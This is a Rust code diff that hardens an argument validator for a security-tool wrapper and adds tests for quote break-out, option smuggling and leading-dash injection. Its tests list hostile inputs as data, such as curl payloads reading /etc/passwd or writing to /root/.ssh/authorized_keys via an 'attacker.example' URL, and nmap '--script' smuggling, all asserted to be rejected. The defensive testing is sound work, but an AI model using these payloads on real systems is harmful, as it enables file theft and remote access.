@@ -40,48 +40,187 @@ static HOSTNAME_RE: LazyLock<Regex> = LazyLock::new(|| {
 static URL_RE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"^https?://[a-zA-Z0-9\-\.]+(/[^\s]*)?$").unwrap());
 
+/// Types whose value is user text handed to the target binary more or less
+/// verbatim. They get the W1.5 hygiene rules (NUL, control characters,
+/// quotes/backslash, whitespace, leading dash) before any type parsing.
+pub const STRING_DERIVED_TYPES: &[&str] = &[
+    "string",
+    "path",
+    "credential_file",
+    "regex_match",
+    "url",
+    "scope_target",
+    "duration",
+    "msf_options",
+];
+
 /// Validate a single argument value against its definition.
 ///
 /// Returns the (possibly transformed) value on success, or a validation error.
+///
+/// This is the strict (template-mode) entry point: `allow_whitespace` is not
+/// honored. Use [`validate_arg_mode`] to validate for a manifest that declared
+/// `command.exec` directly.
 pub fn validate_arg(name: &str, def: &ArgDef, value: &str) -> Result<String, ToolCladError> {
+    validate_arg_mode(name, def, value, false)
+}
+
+/// Validate a single argument value, stating whether the manifest's command
+/// form is a declared `exec` array (`exec_mode = true`).
+///
+/// `exec_mode` only affects `allow_whitespace`: an `exec` element is one argv
+/// entry that is never re-split, so whitespace inside it is safe to opt into.
+/// A `template` — even one compiled to exec at load — stays strict.
+pub fn validate_arg_mode(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    exec_mode: bool,
+) -> Result<String, ToolCladError> {
+    // Rule 1 applies to every type, enum and numerics included.
+    if value.contains('\0') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain NUL bytes"
+        )));
+    }
+
+    let type_name = def.type_name.as_str();
+    if STRING_DERIVED_TYPES.contains(&type_name) {
+        // Hygiene runs on the raw value: nothing is trimmed away first.
+        check_value_hygiene(name, def, value, exec_mode)?;
+        return match type_name {
+            "string" => validate_string(name, def, value, true),
+            "scope_target" => validate_scope_target(name, def, value),
+            "url" => validate_url(name, def, value),
+            "path" => validate_path(name, value),
+            "msf_options" => validate_msf_options(name, def, value),
+            "credential_file" => validate_credential_file(name, def, value),
+            "duration" => validate_duration(name, def, value),
+            "regex_match" => validate_regex_match(name, def, value),
+            _ => unreachable!("string-derived type dispatch is exhaustive"),
+        };
+    }
+
     let val = value.trim();
 
-    // Network-shaped types (hostname, URL, IP, CIDR) reject leading/trailing
-    // whitespace at the source: RFC 1035 / RFC 5891 don't permit terminal
-    // whitespace in labels, and silently trimming would let "example.com "
-    // through to validators that already passed structural checks.
-    let strict_no_whitespace = matches!(
-        def.type_name.as_str(),
-        "scope_target" | "url" | "ip_address" | "cidr"
-    );
+    // IP and CIDR literals reject leading/trailing whitespace at the source;
+    // silently trimming would let "10.0.0.1 " through to validators that
+    // already passed structural checks.
+    let strict_no_whitespace = matches!(type_name, "ip_address" | "cidr");
     if strict_no_whitespace && val.len() != value.len() {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' must not contain leading or trailing whitespace"
         )));
     }
 
-    // Apply injection sanitization if requested or for types that require it.
-    match def.type_name.as_str() {
-        "string" => validate_string(name, def, val, true),
-        "integer" => validate_integer(name, def, val),
-        "number" => validate_number(name, def, val),
-        "port" => validate_port(name, val),
+    match type_name {
+        // Numeric types apply the leading-dash rule to the output, after
+        // range checks and clamping, so `-5` with `clamp` and `min = 1`
+        // yields `1` and passes while a bare `-1` is refused.
+        "integer" => validate_integer(name, def, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
+        "number" => validate_number(name, def, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
+        "port" => validate_port(name, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
         "boolean" => validate_boolean(name, val),
         "enum" => validate_enum(name, def, val),
-        "scope_target" => validate_scope_target(name, def, val),
-        "url" => validate_url(name, def, val),
-        "path" => validate_path(name, val),
         "ip_address" => validate_ip_address(name, val),
         "cidr" => validate_cidr(name, val),
-        "msf_options" => validate_msf_options(name, def, val),
-        "credential_file" => validate_credential_file(name, def, val),
-        "duration" => validate_duration(name, def, val),
-        "regex_match" => validate_regex_match(name, def, val),
         _ => Err(ToolCladError::ValidationError(format!(
             "unknown argument type '{}' for '{}'",
             def.type_name, name
         ))),
     }
+}
+
+/// True for C0 control characters (U+0000–U+001F), DEL (U+007F), and the C1
+/// range (U+0080–U+009F). Tab, newline, carriage return, vertical tab and form
+/// feed are all included: a tool argument never needs a control byte, and
+/// `\r`/`\n` are the line-injection characters.
+fn is_control_char(c: char) -> bool {
+    let cp = c as u32;
+    cp < 0x20 || (0x7f..=0x9f).contains(&cp)
+}
+
+/// Reject a value that starts with `-` or `+` unless the arg opts in with
+/// `allow_leading_dash = true`. Such a value would otherwise be parsed by the
+/// target binary as an option.
+fn reject_leading_dash(name: &str, def: &ArgDef, value: &str) -> Result<(), ToolCladError> {
+    if !def.allow_leading_dash && (value.starts_with('-') || value.starts_with('+')) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+        )));
+    }
+    Ok(())
+}
+
+/// W1.5 string-derived value hygiene, checked in order before any
+/// type-specific parsing: control characters, quotes/backslash, whitespace,
+/// leading dash. (NUL is checked by the caller for every type.)
+fn check_value_hygiene(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    exec_mode: bool,
+) -> Result<(), ToolCladError> {
+    let type_name = def.type_name.as_str();
+    // `msf_options` needs the space as its `KEY VALUE` separator. A `url`
+    // never contains whitespace, opt-in or not. Everything else may opt in
+    // only when the command form is a declared exec array. Either way the
+    // only whitespace ever admitted is the ASCII space U+0020: a tab or a
+    // newline is line injection, and a non-breaking or ideographic space is a
+    // homoglyph, not a separator.
+    let space_allowed =
+        type_name == "msf_options" || (def.allow_whitespace && exec_mode && type_name != "url");
+
+    // Rule 2 is unconditional; `allow_whitespace` never relaxes it.
+    if value.chars().any(is_control_char) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain control characters"
+        )));
+    }
+
+    if type_name == "scope_target" && value.contains('\\') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' scope_target must not contain backslash escape sequences"
+        )));
+    }
+    if value.contains(['\'', '"', '\\']) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain quote or backslash characters"
+        )));
+    }
+
+    if value
+        .chars()
+        .any(|c| c.is_whitespace() && !(space_allowed && c == ' '))
+    {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain whitespace"
+        )));
+    }
+
+    reject_leading_dash(name, def, value)
+}
+
+/// Anchor a user-supplied pattern so it must match the whole value: strip one
+/// leading `^` and one trailing unescaped `$`, then wrap as `^(?:<pat>)$`.
+/// Without this, `pattern = "[a-z]+"` would accept `abc123`.
+pub fn anchor_pattern(pat: &str) -> String {
+    let inner = pat.strip_prefix('^').unwrap_or(pat);
+    let inner = match inner.strip_suffix('$') {
+        Some(stripped) if !stripped.ends_with('\\') => stripped,
+        _ => inner,
+    };
+    format!("^(?:{inner})$")
+}
+
+/// Compile an arg's `pattern`, anchored, surfacing a bad pattern as a
+/// manifest error.
+fn compile_anchored(name: &str, pat: &str) -> Result<Regex, ToolCladError> {
+    Regex::new(&anchor_pattern(pat))
+        .map_err(|e| ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}")))
 }
 
 /// Check that a value contains no shell metacharacters.
@@ -106,9 +245,7 @@ fn validate_string(
         reject_injection(name, val)?;
     }
     if let Some(ref pat) = def.pattern {
-        let re = Regex::new(pat).map_err(|e| {
-            ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}"))
-        })?;
+        let re = compile_anchored(name, pat)?;
         if !re.is_match(val) {
             return Err(ToolCladError::ValidationError(format!(
                 "argument '{name}' does not match pattern '{pat}'"
@@ -370,9 +507,9 @@ fn always_blocked_ip_reason(ip: &IpAddr) -> Option<&'static str> {
         IpAddr::V6(a) => a.to_ipv4_mapped(),
     };
     if let Some(a) = v4 {
-        return a
-            .is_link_local()
-            .then_some("is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked");
+        return a.is_link_local().then_some(
+            "is a link-local / cloud-metadata address (169.254.0.0/16) — always blocked",
+        );
     }
     if let IpAddr::V6(a) = ip {
         if (a.segments()[0] & 0xffc0) == 0xfe80 {
@@ -612,8 +749,7 @@ fn validate_regex_match(name: &str, def: &ArgDef, val: &str) -> Result<String, T
             "argument '{name}' is type 'regex_match' but has no 'pattern' field"
         ))
     })?;
-    let re = Regex::new(pat)
-        .map_err(|e| ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}")))?;
+    let re = compile_anchored(name, pat)?;
     if !re.is_match(val) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' does not match required pattern '{pat}'"
@@ -625,11 +761,25 @@ fn validate_regex_match(name: &str, def: &ArgDef, val: &str) -> Result<String, T
 /// Validate an argument using custom type definitions.
 /// If the arg type matches a custom type, create a synthetic ArgDef from the custom type
 /// and delegate to the base type validator.
+///
+/// Strict (template-mode) entry point; see [`validate_arg_with_custom_types_mode`].
 pub fn validate_arg_with_custom_types(
     name: &str,
     def: &ArgDef,
     value: &str,
     custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
+) -> Result<String, ToolCladError> {
+    validate_arg_with_custom_types_mode(name, def, value, custom_types, false)
+}
+
+/// [`validate_arg_with_custom_types`] with an explicit command-form mode;
+/// `exec_mode` has the same meaning as in [`validate_arg_mode`].
+pub fn validate_arg_with_custom_types_mode(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    custom_types: &std::collections::HashMap<String, crate::types::CustomTypeDef>,
+    exec_mode: bool,
 ) -> Result<String, ToolCladError> {
     // Check if the type is a custom type
     if let Some(custom) = custom_types.get(&def.type_name) {
@@ -661,16 +811,18 @@ pub fn validate_arg_with_custom_types(
         if let Some(max_f) = custom.max_float {
             synthetic.max_float = Some(max_f);
         }
-        return validate_arg(name, &synthetic, value);
+        return validate_arg_mode(name, &synthetic, value, exec_mode);
     }
 
     // Not a custom type, use standard validation
-    validate_arg(name, def, value)
+    validate_arg_mode(name, def, value, exec_mode)
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::types::CustomTypeDef;
+    use std::collections::HashMap;
 
     fn make_arg(type_name: &str) -> ArgDef {
         ArgDef {
@@ -881,11 +1033,11 @@ mod tests {
         // pass as canonical IPs or sneak through as "hostnames".
         let def = make_arg("scope_target");
         for v in [
-            "2130706433",  // decimal integer
-            "0x7f000001",  // hex
-            "0177.0.0.1",  // octal-leading
-            "127.1",       // shorthand
-            "010.0.0.1",   // leading-zero octet
+            "2130706433", // decimal integer
+            "0x7f000001", // hex
+            "0177.0.0.1", // octal-leading
+            "127.1",      // shorthand
+            "010.0.0.1",  // leading-zero octet
         ] {
             assert!(validate_arg("t", &def, v).is_err(), "should reject {v}");
         }
@@ -936,7 +1088,12 @@ mod tests {
     #[test]
     fn test_scope_target_blocks_metadata_unconditionally() {
         let def = make_arg("scope_target"); // block_internal = false
-        for v in ["169.254.169.254", "169.254.0.1", "::ffff:169.254.169.254", "fe80::1"] {
+        for v in [
+            "169.254.169.254",
+            "169.254.0.1",
+            "::ffff:169.254.169.254",
+            "fe80::1",
+        ] {
             let err = validate_arg("t", &def, v).unwrap_err().to_string();
             assert!(err.contains("always blocked"), "{v} -> {err}");
         }
@@ -949,7 +1106,7 @@ mod tests {
             "127.0.0.1",
             "10.0.0.5",
             "192.168.1.1",
-            "169.254.169.254",  // IMDS (always-block path)
+            "169.254.169.254", // IMDS (always-block path)
             "0.0.0.0",
             "::1",
             "::ffff:127.0.0.1", // v4-mapped loopback must be unwrapped
@@ -980,7 +1137,11 @@ mod tests {
         assert!(validate_arg("u", &public, "http://xn--example-9c.com/").is_err());
         // loopback allowed only when block_internal is off
         assert!(validate_arg("u", &public, "http://127.0.0.1/").is_ok());
-        let blocking = ArgDef { type_name: "url".to_string(), block_internal: true, ..Default::default() };
+        let blocking = ArgDef {
+            type_name: "url".to_string(),
+            block_internal: true,
+            ..Default::default()
+        };
         assert!(validate_arg("u", &blocking, "http://127.0.0.1/").is_err());
         assert!(validate_arg("u", &blocking, "http://10.0.0.5/x").is_err());
     }
@@ -1161,5 +1322,274 @@ mod tests {
     fn test_regex_match_no_pattern() {
         let def = make_arg("regex_match");
         assert!(validate_arg("code", &def, "anything").is_err()); // missing pattern
+    }
+
+    // ---- W1.5 string-derived value hygiene ------------------------------
+
+    #[test]
+    fn test_tc1_payloads_rejected() {
+        // Quote break-out into extra curl options.
+        let s = make_arg("string");
+        assert!(validate_arg("h", &s, "' -d @/etc/passwd").is_err());
+        assert!(validate_arg("h", &s, "X: y' -d @/etc/passwd -H 'Z: w").is_err());
+        let u = make_arg("url");
+        assert!(validate_arg(
+            "u",
+            &u,
+            "https://attacker.example/ -o /root/.ssh/authorized_keys"
+        )
+        .is_err());
+        assert!(validate_arg("u", &u, "https://attacker.example/ -o /tmp/pwned").is_err());
+
+        // exec mode with allow_whitespace does not rescue any of them: quotes
+        // are banned outright and a url never admits whitespace.
+        let mut s2 = make_arg("string");
+        s2.allow_whitespace = true;
+        assert!(validate_arg_mode("h", &s2, "' -d @/etc/passwd", true).is_err());
+        assert!(validate_arg_mode("h", &s2, "X: y' -d @/etc/passwd -H 'Z: w", true).is_err());
+        let mut u2 = make_arg("url");
+        u2.allow_whitespace = true;
+        assert!(
+            validate_arg_mode("u", &u2, "https://attacker.example/ -o /tmp/pwned", true).is_err()
+        );
+    }
+
+    #[test]
+    fn test_tc2_payloads_rejected() {
+        // Option smuggling through a free-text "extra flags" string.
+        let payloads = [
+            "-iL /etc/passwd",
+            "--script=/tmp/evil.nse",
+            "--script http-fetch --script-args http-fetch.destination=/tmp/d",
+        ];
+        let s = make_arg("string");
+        for v in payloads {
+            assert!(
+                validate_arg("extra_flags", &s, v).is_err(),
+                "should reject {v:?}"
+            );
+        }
+        // Even with whitespace permitted in exec mode, the leading dash holds.
+        let mut s2 = make_arg("string");
+        s2.allow_whitespace = true;
+        for v in payloads {
+            let err = validate_arg_mode("extra_flags", &s2, v, true)
+                .unwrap_err()
+                .to_string();
+            assert!(
+                err.contains("must not start with '-' or '+'"),
+                "{v:?}: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_tc3_leading_dash_rejected() {
+        let err = validate_arg("p", &make_arg("path"), "-rf")
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains(
+                "must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+            ),
+            "unexpected: {err}"
+        );
+        assert!(validate_arg("s", &make_arg("string"), "--output=/etc/cron.d/x").is_err());
+        assert!(validate_arg("n", &make_arg("integer"), "-1").is_err());
+        assert!(validate_arg("s", &make_arg("string"), "+short").is_err());
+        assert!(validate_arg("f", &make_arg("number"), "-0.5").is_err());
+
+        // Numeric types apply the rule to the output: clamping rescues a
+        // negative input, and a leading '+' that parses away is fine.
+        let mut n = make_arg("integer");
+        n.min = Some(1);
+        n.clamp = true;
+        assert_eq!(validate_arg("n", &n, "-5").unwrap(), "1");
+        let mut f = make_arg("number");
+        f.min_float = Some(0.0);
+        f.clamp = true;
+        assert_eq!(validate_arg("f", &f, "-2.5").unwrap(), "0");
+        assert_eq!(validate_arg("n", &make_arg("integer"), "+7").unwrap(), "7");
+    }
+
+    #[test]
+    fn test_tc3_allow_leading_dash_opt_in() {
+        let mut s = make_arg("string");
+        s.allow_leading_dash = true;
+        assert_eq!(validate_arg("s", &s, "-v").unwrap(), "-v");
+        // The opt-in is independent of the command form.
+        assert_eq!(validate_arg_mode("s", &s, "-v", true).unwrap(), "-v");
+        let mut n = make_arg("integer");
+        n.allow_leading_dash = true;
+        assert_eq!(validate_arg("n", &n, "-1").unwrap(), "-1");
+        // Without the opt-in, exec mode does not help.
+        assert!(validate_arg_mode("s", &make_arg("string"), "-v", true).is_err());
+    }
+
+    #[test]
+    fn test_nul_rejected_for_every_type() {
+        for t in SUPPORTED_TYPES {
+            let mut d = make_arg(t);
+            if *t == "enum" {
+                // Only the NUL rule can refuse this: the value is in `allowed`.
+                d.allowed = Some(vec!["a\0b".to_string()]);
+            }
+            if *t == "regex_match" {
+                d.pattern = Some(".*".to_string());
+            }
+            let err = validate_arg("x", &d, "a\0b").unwrap_err().to_string();
+            assert!(err.contains("must not contain NUL bytes"), "{t}: {err}");
+        }
+    }
+
+    #[test]
+    fn test_control_chars_quotes_whitespace_rejected() {
+        let s = make_arg("string");
+        let err = validate_arg("s", &s, "a\x01b").unwrap_err().to_string();
+        assert!(err.contains("must not contain control characters"), "{err}");
+        assert!(validate_arg("s", &s, "a\x7fb").is_err());
+        assert!(validate_arg("s", &s, "a\tb").is_err());
+        assert!(validate_arg("s", &s, "a\nb").is_err());
+        // C1 range (U+0080–U+009F) counts as control too.
+        let err = validate_arg("s", &s, "a\u{85}b").unwrap_err().to_string();
+        assert!(err.contains("must not contain control characters"), "{err}");
+        assert!(validate_arg("s", &s, "a\u{80}b").is_err());
+        assert!(validate_arg("s", &s, "a\u{9f}b").is_err());
+
+        let err = validate_arg("s", &s, "a'b").unwrap_err().to_string();
+        assert!(
+            err.contains("must not contain quote or backslash characters"),
+            "{err}"
+        );
+        assert!(validate_arg("s", &s, "a\"b").is_err());
+        assert!(validate_arg("s", &s, "a\\b").is_err());
+
+        let err = validate_arg("s", &s, "a b").unwrap_err().to_string();
+        assert!(err.contains("must not contain whitespace"), "{err}");
+        assert!(validate_arg("s", &s, "a\u{a0}b").is_err()); // non-ASCII whitespace
+        assert!(validate_arg("s", &s, " a").is_err()); // raw value, never trimmed
+
+        // The rules cover every string-derived type.
+        for t in STRING_DERIVED_TYPES {
+            let mut d = make_arg(t);
+            if *t == "regex_match" {
+                d.pattern = Some(".*".to_string());
+            }
+            assert!(
+                validate_arg("x", &d, "a'b").is_err(),
+                "{t} should reject a quote"
+            );
+            assert!(
+                validate_arg("x", &d, "a\x01b").is_err(),
+                "{t} should reject a control char"
+            );
+        }
+
+        // scope_target keeps its more specific backslash message.
+        let err = validate_arg("t", &make_arg("scope_target"), "a\\b")
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("backslash escape sequences"), "{err}");
+
+        // enum is exempt from rules 2–5: allowed values are manifest text.
+        let mut e = make_arg("enum");
+        e.allowed = Some(vec!["-sV".to_string(), "a b".to_string()]);
+        assert_eq!(validate_arg("e", &e, "-sV").unwrap(), "-sV");
+        assert_eq!(validate_arg("e", &e, "a b").unwrap(), "a b");
+    }
+
+    #[test]
+    fn test_allow_whitespace_only_in_exec_mode() {
+        let mut s = make_arg("string");
+        s.allow_whitespace = true;
+        assert!(validate_arg("s", &s, "a b").is_err()); // public default is strict
+        assert!(validate_arg_mode("s", &s, "a b", false).is_err());
+        assert_eq!(validate_arg_mode("s", &s, "a b", true).unwrap(), "a b");
+        assert_eq!(
+            validate_arg_mode("s", &s, "X-Trace: abc def", true).unwrap(),
+            "X-Trace: abc def"
+        );
+        // The opt-in admits ONLY the ASCII space U+0020. Control whitespace is
+        // still a control character (rule 2 is unconditional) and every other
+        // Unicode space is a homoglyph, not a separator.
+        for v in ["a\tb", "a\nb", "a\rb", "a\x0bb", "a\x0cb"] {
+            let err = validate_arg_mode("s", &s, v, true).unwrap_err().to_string();
+            assert!(
+                err.contains("must not contain control characters"),
+                "{v:?}: {err}"
+            );
+        }
+        for v in [
+            "a\u{a0}b",
+            "a\u{2000}b",
+            "a\u{200a}b",
+            "a\u{2028}b",
+            "a\u{2029}b",
+            "a\u{3000}b",
+        ] {
+            let err = validate_arg_mode("s", &s, v, true).unwrap_err().to_string();
+            assert!(err.contains("must not contain whitespace"), "{v:?}: {err}");
+        }
+        assert!(validate_arg_mode("s", &s, "a\x01b", true).is_err());
+        // Without the opt-in, exec mode is still strict.
+        assert!(validate_arg_mode("s", &make_arg("string"), "a b", true).is_err());
+        // msf_options keeps its space separator in every mode, and only U+0020.
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS 10.0.1.1").is_ok());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS\t10.0.1.1").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS\u{a0}10.0.1.1").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "RHOSTS 'x'").is_err());
+        assert!(validate_arg("m", &make_arg("msf_options"), "-RHOSTS x").is_err());
+    }
+
+    #[test]
+    fn test_pattern_is_anchored() {
+        let mut s = make_arg("string");
+        s.pattern = Some("[a-z]+".to_string());
+        assert!(validate_arg("s", &s, "abc").is_ok());
+        assert!(validate_arg("s", &s, "abc123").is_err());
+        assert!(validate_arg("s", &s, "123abc").is_err());
+        let mut r = make_arg("regex_match");
+        r.pattern = Some("[a-z]+".to_string());
+        assert!(validate_arg("r", &r, "abc").is_ok());
+        assert!(validate_arg("r", &r, "abc123").is_err());
+
+        assert_eq!(anchor_pattern("[a-z]+"), "^(?:[a-z]+)$");
+        assert_eq!(anchor_pattern("^[a-z]+$"), "^(?:[a-z]+)$");
+        assert_eq!(anchor_pattern(r"a\$"), r"^(?:a\$)$");
+
+        // Custom types go through the same anchoring.
+        let custom = HashMap::from([(
+            "slug".to_string(),
+            CustomTypeDef {
+                base: "string".to_string(),
+                allowed: None,
+                pattern: Some("[a-z]+".to_string()),
+                min: None,
+                max: None,
+                min_float: None,
+                max_float: None,
+            },
+        )]);
+        assert!(validate_arg_with_custom_types("s", &make_arg("slug"), "abc123", &custom).is_err());
+        assert!(validate_arg_with_custom_types("s", &make_arg("slug"), "abc", &custom).is_ok());
+        // ...and the custom-type path honors the mode flag the same way.
+        let mut spaced = make_arg("slug");
+        spaced.allow_whitespace = true;
+        let custom_any = HashMap::from([(
+            "slug".to_string(),
+            CustomTypeDef {
+                base: "string".to_string(),
+                allowed: None,
+                pattern: Some("[a-z ]+".to_string()),
+                min: None,
+                max: None,
+                min_float: None,
+                max_float: None,
+            },
+        )]);
+        assert!(validate_arg_with_custom_types("s", &spaced, "a b", &custom_any).is_err());
+        assert!(
+            validate_arg_with_custom_types_mode("s", &spaced, "a b", &custom_any, true).is_ok()
+        );
     }
 }
